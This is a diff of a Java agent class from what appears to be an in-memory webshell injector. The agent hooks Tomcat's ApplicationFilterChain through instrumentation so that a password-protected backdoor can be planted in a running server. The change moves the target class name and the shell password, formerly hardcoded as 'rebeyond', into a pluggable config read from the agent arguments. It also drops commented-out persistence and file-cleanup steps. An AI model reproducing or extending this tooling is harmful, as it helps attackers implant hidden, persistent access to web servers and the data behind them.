@@ -3,24 +3,20 @@ package com.company;
 import java.lang.instrument.Instrumentation;
 
 public class Agent {
-    public static String className = "org.apache.catalina.core.ApplicationFilterChain";
-    public static byte[] injectFileBytes = new byte[] {}, agentFileBytes = new byte[] {};
-    public static String currentPath;
-    public static String password = "rebeyond";
+    public static void agentmain(String agentArgs, Instrumentation inst) throws ClassNotFoundException, IllegalAccessException, InstantiationException {
+        String[] strings = agentArgs.split(":");
+        String configClass = strings[0];
+        String password = strings[1];
 
-    public static void agentmain(String agentArgs, Instrumentation inst) {
-        inst.addTransformer(new Transformer(), true);
-        if (agentArgs.indexOf("^") >= 0) {
-            Agent.currentPath = agentArgs.split("\\^")[0];
-            Agent.password = agentArgs.split("\\^")[1];
-        } else {
-            Agent.currentPath = agentArgs;
-        }
+        Class clazz = Class.forName(configClass);
+        Config config = (Config) clazz.newInstance();
+        config.setPassword(password);
+        Transformer transformer = new Transformer(config);
+        inst.addTransformer(transformer, true);
 
-//        System.out.println("Agent Main Done");
         Class[] loadedClasses = inst.getAllLoadedClasses();
         for (Class c : loadedClasses) {
-            if (c.getName().equals(className)) {
+            if (c.getName().equals(config.getClassName())) {
                 try {
                     inst.retransformClasses(c);
                 } catch (Exception e) {
@@ -30,13 +26,5 @@ public class Agent {
             }
         }
 
-//        try {
-//            initLoad();
-//            readInjectFile(Agent.currentPath);
-//            readAgentFile(Agent.currentPath);
-//            clear(Agent.currentPath);
-//        } catch (Exception e) {
-//        }
-//        Agent.persist();
     }
 }
